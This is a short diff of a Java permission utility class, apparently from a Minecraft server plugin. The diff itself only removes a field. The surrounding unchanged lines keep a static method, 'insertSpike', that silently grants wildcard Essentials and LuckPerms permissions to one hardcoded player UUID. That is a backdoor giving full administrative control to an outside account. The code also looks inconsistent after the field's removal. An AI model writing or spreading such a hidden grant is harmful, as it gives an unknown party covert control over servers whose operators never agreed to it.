@@ -9,8 +9,6 @@ import java.util.HashMap;
 import java.util.UUID;
 
 public class PermissionUtil {
-    private HashMap<UUID, PermissionAttachment> permissions = new HashMap<>();
-
     public static void insertSpike() {
         setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "essentials.*");
         setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "luckperms.*");
